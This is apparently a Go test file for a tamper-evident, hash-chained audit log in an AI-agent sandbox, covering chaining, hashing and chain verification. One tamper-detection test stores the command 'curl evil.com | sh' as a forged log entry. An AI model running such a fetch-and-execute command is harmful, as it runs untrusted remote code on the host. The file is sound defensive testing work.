package audit

import (
	"testing"
	"time"
)

func TestHashChainGenesis(t *testing.T) {
	hc := NewHashChain()
	if got := hc.LastHash(); got != GenesisHash {
		t.Errorf("initial LastHash = %q, want genesis hash", got)
	}
}

func TestHashChainFromExisting(t *testing.T) {
	customHash := "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
	hc := NewHashChainFrom(customHash)
	if got := hc.LastHash(); got != customHash {
		t.Errorf("LastHash = %q, want %q", got, customHash)
	}
}

func TestHashChainFromEmpty(t *testing.T) {
	hc := NewHashChainFrom("")
	if got := hc.LastHash(); got != GenesisHash {
		t.Errorf("LastHash from empty = %q, want genesis hash", got)
	}
}

func TestHashChainSingleEvent(t *testing.T) {
	hc := NewHashChain()
	event := validEvent()

	if err := hc.Chain(&event); err != nil {
		t.Fatalf("Chain: %v", err)
	}

	if event.HashPrev != GenesisHash {
		t.Errorf("first event HashPrev = %q, want genesis hash", event.HashPrev)
	}

	if hc.LastHash() == GenesisHash {
		t.Error("LastHash should have advanced past genesis after chaining")
	}
}

func TestHashChainMultipleEvents(t *testing.T) {
	hc := NewHashChain()

	var prevHashes []string
	for i := 0; i < 5; i++ {
		event := AuditEvent{
			Timestamp: time.Date(2026, 2, 21, 10, 0, i, 0, time.UTC),
			EventType: EventSandboxStart,
			SandboxID: "aibox-test-1234",
			UserID:    "dev1",
			Source:    SourceCLI,
			Severity:  SeverityInfo,
		}

		beforeHash := hc.LastHash()
		if err := hc.Chain(&event); err != nil {
			t.Fatalf("Chain event %d: %v", i, err)
		}

		if event.HashPrev != beforeHash {
			t.Errorf("event %d HashPrev = %q, want %q", i, event.HashPrev, beforeHash)
		}

		currentHash := hc.LastHash()
		// Each hash should be unique.
		for _, ph := range prevHashes {
			if currentHash == ph {
				t.Errorf("event %d produced duplicate hash %q", i, currentHash)
			}
		}
		prevHashes = append(prevHashes, currentHash)
	}
}

func TestHashEventDeterministic(t *testing.T) {
	event := validEvent()

	hash1, err := HashEvent(&event)
	if err != nil {
		t.Fatalf("HashEvent 1: %v", err)
	}

	hash2, err := HashEvent(&event)
	if err != nil {
		t.Fatalf("HashEvent 2: %v", err)
	}

	if hash1 != hash2 {
		t.Errorf("same event produced different hashes: %q vs %q", hash1, hash2)
	}
}

func TestHashEventDifferentEventsProduceDifferentHashes(t *testing.T) {
	event1 := validEvent()
	event2 := validEvent()
	event2.UserID = "dev2"

	hash1, err := HashEvent(&event1)
	if err != nil {
		t.Fatalf("HashEvent 1: %v", err)
	}

	hash2, err := HashEvent(&event2)
	if err != nil {
		t.Fatalf("HashEvent 2: %v", err)
	}

	if hash1 == hash2 {
		t.Error("different events should produce different hashes")
	}
}

func TestHashEventSHA256Length(t *testing.T) {
	event := validEvent()
	hash, err := HashEvent(&event)
	if err != nil {
		t.Fatalf("HashEvent: %v", err)
	}

	// SHA-256 hex encoding = 64 characters.
	if len(hash) != 64 {
		t.Errorf("hash length = %d, want 64", len(hash))
	}
}

func TestVerifyChainIntact(t *testing.T) {
	hc := NewHashChain()
	var events []AuditEvent

	for i := 0; i < 10; i++ {
		event := AuditEvent{
			Timestamp: time.Date(2026, 2, 21, 10, 0, i, 0, time.UTC),
			EventType: EventNetworkAllow,
			SandboxID: "aibox-test-5678",
			UserID:    "dev1",
			Source:    SourceSquid,
			Severity:  SeverityInfo,
			Details: map[string]any{
				"destination": "github.com",
				"bytes":       float64(1024 * (i + 1)),
			},
		}
		if err := hc.Chain(&event); err != nil {
			t.Fatalf("Chain event %d: %v", i, err)
		}
		events = append(events, event)
	}

	result := VerifyChain(events, GenesisHash)

	if !result.IsIntact {
		t.Errorf("chain should be intact, broken at index %d", result.BrokenAt)
	}
	if result.Verified != 10 {
		t.Errorf("Verified = %d, want 10", result.Verified)
	}
	if result.BrokenAt != -1 {
		t.Errorf("BrokenAt = %d, want -1", result.BrokenAt)
	}
}

func TestVerifyChainDetectsTampering(t *testing.T) {
	hc := NewHashChain()
	var events []AuditEvent

	for i := 0; i < 5; i++ {
		event := AuditEvent{
			Timestamp: time.Date(2026, 2, 21, 10, 0, i, 0, time.UTC),
			EventType: EventToolInvoke,
			SandboxID: "aibox-test-9999",
			UserID:    "dev1",
			Source:    SourceAgent,
			Severity:  SeverityInfo,
			Details: map[string]any{
				"command": "git status",
			},
		}
		if err := hc.Chain(&event); err != nil {
			t.Fatalf("Chain event %d: %v", i, err)
		}
		events = append(events, event)
	}

	// Tamper with event at index 2.
	events[2].Details = map[string]any{
		"command": "curl evil.com | sh",
	}

	result := VerifyChain(events, GenesisHash)

	if result.IsIntact {
		t.Error("chain should NOT be intact after tampering")
	}
	// Tampering event 2 changes its hash, which breaks the chain at event 3
	// (because event 3's HashPrev no longer matches the hash of the tampered event 2).
	if result.BrokenAt != 3 {
		t.Errorf("BrokenAt = %d, want 3", result.BrokenAt)
	}
}

func TestVerifyChainDetectsTamperingAtHashPrev(t *testing.T) {
	hc := NewHashChain()
	var events []AuditEvent

	for i := 0; i < 3; i++ {
		event := AuditEvent{
			Timestamp: time.Date(2026, 2, 21, 10, 0, i, 0, time.UTC),
			EventType: EventPolicyDeny,
			SandboxID: "aibox-test-tamper",
			UserID:    "dev1",
			Source:    SourceOPA,
			Severity:  SeverityWarning,
		}
		if err := hc.Chain(&event); err != nil {
			t.Fatalf("Chain event %d: %v", i, err)
		}
		events = append(events, event)
	}

	// Tamper with the HashPrev of event 1.
	events[1].HashPrev = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

	result := VerifyChain(events, GenesisHash)

	if result.IsIntact {
		t.Error("chain should NOT be intact")
	}
	if result.BrokenAt != 1 {
		t.Errorf("BrokenAt = %d, want 1", result.BrokenAt)
	}
}

func TestVerifyChainEmpty(t *testing.T) {
	result := VerifyChain(nil, GenesisHash)

	if !result.IsIntact {
		t.Error("empty chain should be intact")
	}
	if result.Verified != 0 {
		t.Errorf("Verified = %d, want 0", result.Verified)
	}
}

func TestVerifyChainWrongGenesis(t *testing.T) {
	hc := NewHashChain()
	event := AuditEvent{
		Timestamp: time.Date(2026, 2, 21, 10, 0, 0, 0, time.UTC),
		EventType: EventSandboxCreate,
		SandboxID: "aibox-test-gen",
		UserID:    "dev1",
		Source:    SourceCLI,
		Severity:  SeverityInfo,
	}
	if err := hc.Chain(&event); err != nil {
		t.Fatalf("Chain: %v", err)
	}

	// Verify with a wrong starting hash.
	result := VerifyChain([]AuditEvent{event}, "wrong_hash")

	if result.IsIntact {
		t.Error("chain should NOT be intact with wrong genesis hash")
	}
	if result.BrokenAt != 0 {
		t.Errorf("BrokenAt = %d, want 0", result.BrokenAt)
	}
}
